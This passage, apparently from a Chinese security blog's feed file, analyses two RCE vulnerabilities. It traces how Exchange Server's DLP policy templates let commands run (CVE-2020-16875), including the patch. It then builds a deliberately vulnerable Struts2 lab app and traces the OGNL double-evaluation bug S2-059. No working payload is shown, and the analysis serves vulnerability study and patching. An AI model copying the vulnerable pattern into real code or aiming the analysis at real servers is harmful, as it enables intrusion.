CmdletLogger.SafeSetLogger(this.CurrentTaskContext.UniqueId, RpsCmdletMetadata.ExecutionResult, &quot;Cancelled&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        IL_1C8:</span><br><span class="line">        ProvisioningLayer.OnComplete(this, !this.CurrentTaskContext.WasCancelled &amp;&amp; !this.HasErrors, null);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序接着会进入到<code>InternalProcessRecord()</code>，实际上是进入了<code>Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.NewDlpPolicy.InternalProcessRecord()</code></p><p><img src="/img/cve-2020-16875/11.png" alt="11"></p><p>在该函数运行后，会进入到<code>&#123;Microsoft.Exchange.MessagingPolicies.CompliancePrograms.Tasks.DlpUtils&#125;.AddTenantDlpPolicy()</code>函数，在这里会造成RCE，函数定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public static void AddTenantDlpPolicy(IConfigDataProvider dataSession, DlpPolicyMetaData dlpPolicy, string organizationParameterValue, out IEnumerable&lt;PSObject&gt; results, bool skipTransportRules &#x3D; false)</span><br><span class="line">&#123;</span><br><span class="line">    results &#x3D; null;</span><br><span class="line">    ADComplianceProgram adcomplianceProgram &#x3D; dlpPolicy.ToAdObject();</span><br><span class="line">    ADComplianceProgramCollection dlpPolicyCollection &#x3D; DlpUtils.GetDlpPolicyCollection(dataSession, DlpUtils.TenantDlpPoliciesCollectionName);</span><br><span class="line">    adcomplianceProgram.OrganizationId &#x3D; dlpPolicyCollection.OrganizationId;</span><br><span class="line">    adcomplianceProgram.SetId(dlpPolicyCollection.Id.GetChildId(dlpPolicy.Name));</span><br><span class="line">    dataSession.Save(adcomplianceProgram, &quot;d:\\dbs\\sh\\e16df\\1128_112205\\cmd\\e\\sources\\dev\\management\\SRC\\Management\\SystemConfigurationTasks\\DlpPolicy\\Utils.cs&quot;, 272, &quot;AddTenantDlpPolicy&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; skipTransportRules必须为false，否则无法触发漏洞</span><br><span class="line">    if (skipTransportRules)</span><br><span class="line">    &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;关键点1</span><br><span class="line">    IEnumerable&lt;string&gt; cmdlets &#x3D; Utils.AddOrganizationScopeToCmdlets(dlpPolicy.PolicyCommands, organizationParameterValue);</span><br><span class="line">    string domainController &#x3D; null;</span><br><span class="line">    ADSessionSettings sessionSettings &#x3D; null;</span><br><span class="line">    MessagingPoliciesSyncLogDataSession messagingPoliciesSyncLogDataSession &#x3D; dataSession as MessagingPoliciesSyncLogDataSession;</span><br><span class="line">    if (messagingPoliciesSyncLogDataSession !&#x3D; null)</span><br><span class="line">    &#123;</span><br><span class="line">        domainController &#x3D; messagingPoliciesSyncLogDataSession.LastUsedDc;</span><br><span class="line">        sessionSettings &#x3D; messagingPoliciesSyncLogDataSession.SessionSettings;</span><br><span class="line">    &#125;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        results &#x3D; CmdletRunner.RunCmdlets(cmdlets, false);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ParseException e)</span><br><span class="line">    &#123;</span><br><span class="line">        DlpUtils.HandleScriptExecutionError(adcomplianceProgram, DlpUtils.GetErrorHandlingDataSession(domainController, sessionSettings, dataSession), e);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (RuntimeException e2)</span><br><span class="line">    &#123;</span><br><span class="line">        DlpUtils.HandleScriptExecutionError(adcomplianceProgram, DlpUtils.GetErrorHandlingDataSession(domainController, sessionSettings, dataSession), e2);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (CmdletExecutionException e3)</span><br><span class="line">    &#123;</span><br><span class="line">        DlpUtils.HandleScriptExecutionError(adcomplianceProgram, DlpUtils.GetErrorHandlingDataSession(domainController, sessionSettings, dataSession), e3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从函数中，可以看到，程序直接读取了<code>dlpPolicy.PolicyCommands</code>，赋值给了<code>cmdlets</code>，</p><p><img src="/img/cve-2020-16875/12.png" alt="12"></p><p>而<code>cmdlets</code>最后则传给了<code>CmdletRunner.RunCmdlets</code>函数，作为<code>powershell</code>运行起来了，从而造成了RCE</p><p><img src="/img/cve-2020-16875/13.png" alt="13"></p><p>进入该函数，可以看到对命令进行了调用</p><p><img src="/img/cve-2020-16875/14.png" alt="14"></p><p>造成这个漏洞形成，主要是因为没有对<code>TemplateData</code>进行过滤，而<code>DlpUtils.AddTenantDlpPolicy()</code>函数会对模板文件中的<code>CommandBlock</code>进行执行，从而导致RCE</p><h3 id="更新补丁"><a href="#更新补丁" class="headerlink" title="更新补丁"></a>更新补丁</h3><p>补丁代码对<code>CommandBlock</code>块的数据进行了多重的验证，首先判断了是否只是包含单个命令，其次再判断传入的<code>cmdlet</code>是否以<code>New-TransportRule</code>开头，接着再判断<code>cmdlet</code>的内容是否有匹配到<code>-DlpPolicy</code>，只要有其中一个不正确，则抛出异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">internal static void ValidateCmdletParameters(string cmdlet, IEnumerable&lt;KeyValuePair&lt;string, string&gt;&gt; requiredParameters)</span><br><span class="line">&#123;</span><br><span class="line">    if (string.IsNullOrWhiteSpace(cmdlet))</span><br><span class="line">    &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Collection&lt;PSParseError&gt; collection2;</span><br><span class="line">    Collection&lt;PSToken&gt; collection &#x3D; PSParser.Tokenize(cmdlet, out collection2);</span><br><span class="line">    if (collection2 !&#x3D; null &amp;&amp; collection2.Count &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        throw new DlpPolicyParsingException(Strings.DlpPolicyNotSupportedCmdlet(cmdlet));</span><br><span class="line">    &#125;</span><br><span class="line">    if (collection !&#x3D; null)</span><br><span class="line">    &#123;</span><br><span class="line">        if ((from token in collection</span><br><span class="line">        where token.Type &#x3D;&#x3D; PSTokenType.Command</span><br><span class="line">        select token).ToList&lt;PSToken&gt;().Count &gt; 1)</span><br><span class="line">        &#123;</span><br><span class="line">            throw new DlpPolicyParsingException(Strings.DlpPolicyMultipleCommandsNotSupported(cmdlet));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bool flag &#x3D; false;</span><br><span class="line">    foreach (KeyValuePair&lt;string, string&gt; keyValuePair in requiredParameters)</span><br><span class="line">    &#123;</span><br><span class="line">        if (cmdlet.StartsWith(keyValuePair.Key, StringComparison.InvariantCultureIgnoreCase))</span><br><span class="line">        &#123;</span><br><span class="line">            if (!Regex.IsMatch(cmdlet, keyValuePair.Value, RegexOptions.IgnoreCase))</span><br><span class="line">            &#123;</span><br><span class="line">                throw new DlpPolicyParsingException(Strings.DlpPolicyMissingRequiredParameter(cmdlet, keyValuePair.Value));</span><br><span class="line">            &#125;</span><br><span class="line">            flag &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!flag)</span><br><span class="line">    &#123;</span><br><span class="line">        throw new DlpPolicyParsingException(Strings.DlpPolicyNotSupportedCmdlet(cmdlet));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="https://srcincite.io/advisories/src-2020-0019/">https://srcincite.io/advisories/src-2020-0019/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
            <tag> Exchange Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-0230 S2-059</title>
      <link href="2020/10/18/CVE-2019-0230-S2-059/"/>
      <url>2020/10/18/CVE-2019-0230-S2-059/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>该漏洞形成，是因为在处理用户输入的时候，进行了二次解析，所以导致了OGNL表达式注入，影响版本 Struts 2.0.0 - Struts 2.5.20。</p><p>漏洞需要开启 Alt Syntax（默认开启），并且只能在 id 属性中触发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The altSyntax is an option that can be defined in struts.properties. By default it is set to true and it is strongly recommend you do not change that unless you are upgrading from WebWork 2.1.7 or previous versions.</span><br></pre></td></tr></table></figure><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载 <code>https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-min-lib.zip</code></p><p>使用IDEA创建一个Struts2项目</p><p><img src="/img/s2-059/1602767848556-7ck.png" alt="1602767848556-7ck.png"></p><p>这里选择 Set up library later<br>创建好后，在IDEA的WEB-INF目录下创建一个lib文件夹，并且把下载好的 struts-2.5.16-min-lib.zip 里面的 jar 包解压到lib目录下<br>然后还需要一个log4j-core.jar，根据版本信息下载对应的 Jar 包放到 lib 目录下，接着右键点击 Add as Library<br>还要设置<code>Facets</code>，<code>Struts.xml</code>和<code>struts-default.xml</code>必须放到同一个<code>facets</code>下，不然会出错</p><p><img src="/img/s2-059/1602768117136-0ju.png" alt="1602768117136-0ju.png"></p><p>在 2.5 的版本，<code>web.xml</code> 的设置如下，idea默认生成的是低版本的配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">         version&#x3D;&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;&#x2F;filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter&lt;&#x2F;filter-class&gt;</span><br><span class="line">    &lt;&#x2F;filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;&#x2F;filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;filter-mapping&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure><p>设置好 <code>web.xml</code>，创建一个<code>package</code></p><p><img src="/img/s2-059/1602769072346-iiz.png" alt="1602769072346-iiz.png"></p><p>对应代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package com.s2059.vuln;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.bcel.internal.generic.ATHROW;</span><br><span class="line"></span><br><span class="line">public class VulnAction &#123;</span><br><span class="line">    private String skillName &#x3D; null;</span><br><span class="line">    private String SUCCESS &#x3D; &quot;success&quot;;</span><br><span class="line"></span><br><span class="line">    public String getSkillName() &#123;</span><br><span class="line">        return skillName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setSkillName(String skillName) &#123;</span><br><span class="line">        this.skillName &#x3D; skillName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String execute() throws Exception &#123;</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在 <code>struts2.xml</code> 中设置对应的action</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">        &quot;-&#x2F;&#x2F;Apache Software Foundation&#x2F;&#x2F;DTD Struts Configuration 2.0&#x2F;&#x2F;EN&quot;</span><br><span class="line">        &quot;http:&#x2F;&#x2F;struts.apache.org&#x2F;dtds&#x2F;struts-2.0.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;struts&gt;</span><br><span class="line">    &lt;package name&#x3D;&quot;poctest&quot; extends&#x3D;&quot;struts-default&quot; namespace&#x3D;&quot;&#x2F;&quot;&gt;</span><br><span class="line">        &lt;action name&#x3D;&quot;vuln&quot; class&#x3D;&quot;com.s2059.vuln.VulnAction&quot; method&#x3D;&quot;execute&quot;&gt;</span><br><span class="line">            &lt;result name&#x3D;&quot;success&quot;&gt;&#x2F;vuln.jsp&lt;&#x2F;result&gt;</span><br><span class="line">        &lt;&#x2F;action&gt;</span><br><span class="line">    &lt;&#x2F;package&gt;</span><br><span class="line">&lt;&#x2F;struts&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建<code>vuln.jsp</code>，漏洞只在 <code>a</code> 标签 <code>id</code> 属性中触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: lex</span><br><span class="line">  Date: 10&#x2F;15&#x2F;20</span><br><span class="line">  Time: 4:39 AM</span><br><span class="line">  To change this template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*&quot; pageEncoding&#x3D;&quot;UTF-8&quot; %&gt;</span><br><span class="line">&lt;%@ taglib prefix&#x3D;&quot;s&quot; uri&#x3D;&quot;&#x2F;struts-tags&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;s2-059&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;s:a id&#x3D;&quot;%&#123;skillName&#125;&quot;&gt;s2-059 test&lt;&#x2F;s:a&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>打开后访问 <code>http://localhost:8080/s2_059_war_exploded/vuln?skillName=s</code></p><p>从IDEA的输出窗口中可以看到如下信息：从IDEA的输出窗口中可以看到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">16-Oct-2020 05:43:40.778 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 298 read class attr -- &#39;setParent&#39;</span><br><span class="line">16-Oct-2020 05:43:40.778 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 299 read class attr -- &#39;(Ljavax&#x2F;servlet&#x2F;jsp&#x2F;tagext&#x2F;Tag;)V&#39;</span><br><span class="line">16-Oct-2020 05:43:40.778 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 300 copying 2 bytes</span><br><span class="line">16-Oct-2020 05:43:40.778 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 301 read class attr -- &#39;%&#123;skillName&#125;&#39;</span><br><span class="line">16-Oct-2020 05:43:40.778 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 302 copying 4 bytes</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 303 copying 4 bytes</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 304 read class attr -- &#39;setId&#39;</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 305 copying 4 bytes</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 306 copying 4 bytes</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 307 read class attr -- &#39;doStartTag&#39;</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 308 copying 4 bytes</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 309 copying 2 bytes</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 310 read class attr -- &#39;org&#x2F;apache&#x2F;jasper&#x2F;runtime&#x2F;JspRuntimeLibrary&#39;</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 311 copying 4 bytes</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 312 read class attr -- &#39;startBufferedBody&#39;</span><br><span class="line">16-Oct-2020 05:43:40.779 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 313 read class attr -- &#39;(Ljavax&#x2F;servlet&#x2F;jsp&#x2F;PageContext;Ljavax&#x2F;servlet&#x2F;jsp&#x2F;tagext&#x2F;BodyTag;)Ljavax&#x2F;servlet&#x2F;jsp&#x2F;JspWriter;&#39;</span><br><span class="line">16-Oct-2020 05:43:40.780 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 314 copying 2 bytes</span><br><span class="line">16-Oct-2020 05:43:40.780 FINE [http-nio-8080-exec-4] org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool 315 read class attr -- &#39;payload test&#39;</span><br></pre></td></tr></table></figure><p>从上面可以看到，在 <code>SetId</code> 之后使用了 <code>doStartTag</code> 函数做处理，然后在 <code>struts2</code> 里面找到这个方法，并且下断点，方法在 <code>org.apache.struts2.views.jsp.ComponentTagSupport</code> 里面定义了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public int doStartTag() throws JspException &#123;</span><br><span class="line">    ValueStack stack &#x3D; this.getStack();</span><br><span class="line">    this.component &#x3D; this.getBean(stack, (HttpServletRequest)this.pageContext.getRequest(), (HttpServletResponse)this.pageContext.getResponse());</span><br><span class="line">    Container container &#x3D; (Container)stack.getContext().get(&quot;com.opensymphony.xwork2.ActionContext.container&quot;);</span><br><span class="line">    container.inject(this.component);</span><br><span class="line">    this.populateParams();</span><br><span class="line">    boolean evalBody &#x3D; this.component.start(this.pageContext.getOut());</span><br><span class="line">    if (evalBody) &#123;</span><br><span class="line">        return this.component.usesBody() ? 2 : 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着到IDEA中查看</p><p><img src="/img/s2-059/1602920428711-ybe.png" alt="1602920428711-ybe.png"></p><p>该函数调用了父类的 <code>populateParams()</code>，在内部对 id 进行了赋值</p><p><img src="/img/s2-059/1602921014034-igw.png" alt="1602921014034-igw.png"></p><p>跟进 <code>setId()</code> 函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void setId(String id) &#123;</span><br><span class="line">    if (id !&#x3D; null) &#123;</span><br><span class="line">        this.id &#x3D; this.findString(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了 <code>this.findString()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected String findString(String expr) &#123;</span><br><span class="line">    return (String)this.findValue(expr, String.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>this.findValue()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">protected Object findValue(String expr, Class toType) &#123;</span><br><span class="line">    if (this.altSyntax() &amp;&amp; toType &#x3D;&#x3D; String.class) &#123;</span><br><span class="line">        return ComponentUtils.containsExpression(expr) ? TextParseUtil.translateVariables(&#39;%&#39;, expr, this.stack) : expr;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        expr &#x3D; this.stripExpressionIfAltSyntax(expr);</span><br><span class="line">        return this.getStack().findValue(expr, toType, this.throwExceptionOnELFailure);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对 <em>this.altSyntax()</em> 和 <code>toType</code> 进行了与操作，判断通过才可以通过，接着跟进 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return ComponentUtils.containsExpression(expr) ? TextParseUtil.translateVariables(&#39;%&#39;, expr, this.stack) : expr;</span><br></pre></td></tr></table></figure><p><img src="/img/s2-059/1602921347433-cro.png" alt="1602921347433-cro.png"></p><p>这里判断 <code>expr</code> 是否包含了 <code>&quot;%&#123;&#125;&quot;</code>，返回 True，所以接着就调用了 <code>TextParseUtil.translateVariables(&#39;%&#39;, expr, this.stack)</code></p><p><img src="/img/s2-059/1602921478668-lbk.png" alt="1602921478668-lbk.png"></p><p>该函数的作用是对属性值做赋值操作，接着进入 <code>this.componment.start()</code> 函数，可以看到，此时 <code>id</code> 的值已经为 <code>s</code></p><p><img src="/img/s2-059/1602920598241-xmi.png" alt="1602920598241-xmi.png"></p><p>跟进 <code>start</code> 方法，最后调用到了 <code>ClosingUIBean.start</code> 方法，此时 <code>result = true</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public boolean start(Writer writer) &#123;</span><br><span class="line">    boolean result &#x3D; super.start(writer);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        this.evaluateParams();</span><br><span class="line">        this.mergeTemplate(writer, this.buildTemplateName(this.openTemplate, this.getDefaultOpenTemplate()));</span><br><span class="line">    &#125; catch (Exception var4) &#123;</span><br><span class="line">        LOG.error(&quot;Could not open template&quot;, var4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>this.evaluateParams()</code> ，实际调用了<code>UIBean.evaluateParams()</code>，函数内调用了 <code>this.populateCOmponentHtmlId(form)</code></p><p><img src="/img/s2-059/1602922073408-vkx.png" alt="1602922073408-vkx.png"></p><p>跟进 <code>this.populateCOmponentHtmlId</code>，此时 <code>id=s</code></p><p><img src="/img/s2-059/1602922125088-mpb.png" alt="1602922125088-mpb.png"></p><p>进入函数 <code>this.findStringIfAltSyntax()</code></p><p><img src="/img/s2-059/1602922268348-znh.png" alt="1602922268348-znh.png"></p><p>因为 <code>this.altSyntax()</code> 返回 <code>true</code>， 所以此时调用了 <code>this.findString(expr)</code>，进入 <code>this.findString()</code></p><p><img src="/img/s2-059/1602922347430-wij.png" alt="1602922347430-wij.png"></p><p>进入 <code>findValue()</code></p><p><img src="/img/s2-059/1602922447994-kfy.png" alt="1602922447994-kfy.png"></p><p>可以看到，此时再次执行了 <code>TextParseUtil.translateVariables()</code> 函数，造成二次解析，所以导致了OGNL注入</p><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="https://paper.seebug.org/1302/">https://paper.seebug.org/1302/</a></p><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-059">https://cwiki.apache.org/confluence/display/WW/S2-059</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-11776 S2-057</title>
      <link href="2020/10/10/Struts2-s2-057/"/>
      <url>2020/10/10/Struts2-s2-057/</url>
      
